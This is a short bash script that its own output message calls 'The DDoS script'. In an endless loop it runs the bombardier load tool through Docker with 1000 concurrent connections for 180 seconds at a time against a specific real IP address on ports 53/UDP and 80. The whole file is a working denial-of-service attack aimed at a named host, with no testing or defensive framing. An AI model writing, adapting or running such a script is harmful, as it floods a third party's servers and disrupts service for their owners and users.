#!/bin/bash -x
DESTS=("85.118.181.8:53/UDP", "85.118.181.8:80")
TIME="180s"
while true
do
   for DEST in ${DESTS[@]}
   do
       docker run -ti --rm alpine/bombardier -c 1000 -d $TIME -l $DEST && say The DDoS script has been finished
   done
done